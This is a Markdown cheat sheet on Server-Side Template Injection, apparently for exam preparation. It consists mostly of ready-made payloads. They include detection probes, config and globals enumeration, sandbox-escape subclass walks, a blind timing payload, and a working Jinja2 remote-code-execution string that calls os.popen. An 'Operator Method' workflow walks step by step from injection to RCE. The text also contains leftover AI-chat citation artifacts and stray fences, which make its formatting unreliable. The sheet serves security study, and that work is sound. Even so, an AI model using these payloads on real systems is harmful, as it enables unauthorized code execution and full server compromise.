

---

``md
> [!ABSTRACT]
> Server-Side Template Injection (SSTI) occurs when user input is embedded into a template and **executed by the server-side template engine**. :contentReference[oaicite:0]{index=0}  
> 
> Instead of being treated as data, the input is interpreted as **code inside the template**, allowing attackers to manipulate execution. :contentReference[oaicite:1]{index=1}  
> 
> It happens when:
> - User input is directly concatenated into templates  
> - Template engine evaluates untrusted input  
> - No proper sanitization  
> 
> Impact:
> - Remote Code Execution (RCE)  
> - Data leakage (configs, env variables)  
> - Full server compromise :contentReference[oaicite:2]{index=2}  
> 
> 🧠 Think: “Your input becomes server-side code”

---

## 🧠 Server-Side Template Injection – Cheat Sheet

---

### 🎯 1. Basic Detection (Math Test)

> [!CHECK]
> Test if input is evaluated  

```jinja
{{7*7}}
````

```jinja
${7*7}
```

---

### 🧪 2. Confirm SSTI Execution

> [!SUCCESS]  
> If evaluated → vulnerable

```jinja
{{config}}
```

```jinja
{{self}}
```

---

### 🧬 3. Identify Template Engine

> [!CHECK]  
> Different engines use different syntax

```jinja
{{7*7}}   # Jinja2 / Twig
${7*7}    # Freemarker
<%= 7*7 %> # ERB
```

---

### 🧩 4. Access Internal Objects

> [!SUCCESS]  
> Explore application objects

```jinja
{{config.items()}}
```

```jinja
{{request}}
```

---

### 🧪 5. File Read / Data Extraction

> [!SUCCESS]  
> Read server data

```jinja
{{config.__class__.__init__.__globals__}}
```

---

### 💥 6. Command Execution (RCE)

> [!DANGER]  
> Execute system commands

```jinja
{{''. __class__.__mro__[2].__subclasses__()}}
```

```jinja
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
```

---

### ⚙️ 7. Sandbox Bypass

> [!ATTENTION]  
> Escape restricted environment

```jinja
{{().__class__.__base__.__subclasses__()}}
```

---

### 🧪 8. Blind SSTI

> [!CHECK]  
> Detect via timing or side effects

```jinja
{{range(10000000)|list}}
```

---

### 💣 9. Engine-Specific Payloads

> [!SUCCESS]  
> Adjust based on engine

```jinja
{{7*7}}          # Jinja2/Twig
${7*7}           # Freemarker
#{7*7}           # Velocity
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Inject test:
    

```jinja
{{7*7}}
```

2. Confirm execution
    
3. Identify engine:
    

```jinja
${7*7}
```

4. Enumerate objects:
    

```jinja
{{config}}
```

5. Escalate to RCE:
    

```jinja
os.popen('id')
```

---

### 🧠 11. Where to Test

> [!ABSTRACT]

- Search fields
    
- Email templates
    
- CMS / blog inputs
    
- User profile fields
    
- Admin panels
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
{{7*7}}
${7*7}
{{config}}
{{self}}
{{().__class__.__base__.__subclasses__()}}
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Input escaped properly
>     
> - Logic-less templates used
>     
> - Sandbox enforced
>     

---

> [!ATTENTION]  
> SSTI depends on:
> 
> - Template engine execution
>     
> - User-controlled input
>     
> 
> No evaluation → no vulnerability

---

```

---

## 🔥 Key Insight (VERY IMPORTANT)

- SSTI is:
  - ❌ Not just injection  
  - ✅ Often leads directly to **RCE**
- Starts simple:
  👉 `{{7*7}}`  
- Ends powerful:
  👉 full server control  

👉 Always think:
**“Is my input being executed as template code?”**

---


Just say 🚀
::contentReference[oaicite:3]{index=3}
```